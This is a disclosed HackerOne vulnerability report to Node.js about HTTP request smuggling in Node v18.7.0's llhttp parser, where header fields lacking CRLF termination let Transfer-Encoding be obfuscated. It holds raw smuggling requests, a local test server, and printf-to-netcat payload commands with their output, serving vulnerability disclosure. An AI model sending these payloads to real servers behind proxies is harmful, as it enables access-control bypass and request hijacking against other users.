# HTTP Request Smuggling Due to Incorrect Parsing of Header Fields

## Report Details
- **Report ID**: 1675191
- **URL**: https://hackerone.com/reports/1675191
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-08-20T03:13:30.523Z
- **Disclosed**: 2022-10-26T08:17:59.080Z

## Reporter
- **Username**: vvx7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** 
The `llhttp` parser in the `http` module in Node v18.7.0 does not correctly handle header fields that are not terminated with CLRF. This may result in HTTP Request Smuggling.

**Description:** 
The following chunked request is processed.  It should be rejected as `Transfer-Encoding` header obfuscation may result in HRS when the upstream proxy does not process the `Transfer-Encoding` header.

A header that precedes the `Transfer-Encoding`, contains an empty value, and is not properly delimited with CLRF may be used for TE obfuscation. 
```
POST / HTTP/1.1
Host: localhost:5000
x:\nTransfer-Encoding: chunked

1
A
0

```

The request is rejected when the preceding header has a value but improper CLRF.
```
POST / HTTP/1.1
Host: localhost:5000
x:x\nTransfer-Encoding: chunked

1
A
0

```

## Steps To Reproduce:

Server
Run the server: `node app.js`

```js
// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/
const http = require('http');

http.createServer((request, response) => {
  let body = [];
  request.on('error', (err) => {
    response.end("Request Error: " + err)
  }).on('data', (chunk) => {
        body.push(chunk);
  }).on('end', () => {
    body = Buffer.concat(body).toString();

    // log the body to stdout to catch the smuggled request
    console.log("Response");
    console.log(request.headers);
    console.log(body);
    console.log("---");

    response.on('error', (err) => {
      // log the body to stdout to catch the smuggled request
        response.end("Response Error: " + err)
    });

    response.end("Body length: " + body.length.toString() + " Body: " + body);
  });
}).listen(5000);
```
Payload
```bash
printf "POST / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
" x:\nTransfer-Encoding: chunked\r\n"\
"\r\n"\
"1\r\n"\
"A\r\n"\
"0\r\n"\
"\r\n" | nc localhost 5000
```
Output
```
HTTP/1.1 200 OK
Date: Sat, 20 Aug 2022 02:59:38 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 22

Body length: 1 Body: A
```
Note:
```bash
printf "POST / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
" Transfer-Encoding: yeet\r\n"\
" Transfer-Encoding: \n"\
" Transfer-Encoding: chunked\r\n"\
"\r\n"\
"1\r\n"\
"A\r\n"\
"0\r\n"\
"\r\n" | nc localhost 5000
```
This also works with the resulting wonky header:
```
HTTP/1.1 200 OK
Date: Sat, 20 Aug 2022 03:06:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 22

Body length: 1 Body: A
Response
{ host: 'localhost:5000', 'transfer-encoding': 'yeet, , chunked' }
A
```

## Impact:

HRS can lead to access control bypass and other issues.

## Supporting Material/References:
{F1875064}


https://hackerone.com/reports/1501679
https://hackerone.com/reports/1238709

## Impact

HTTP Request Smuggling can lead to access control bypass.

## Attachments
- CleanShot_2022-08-19_at_23.09.24.png
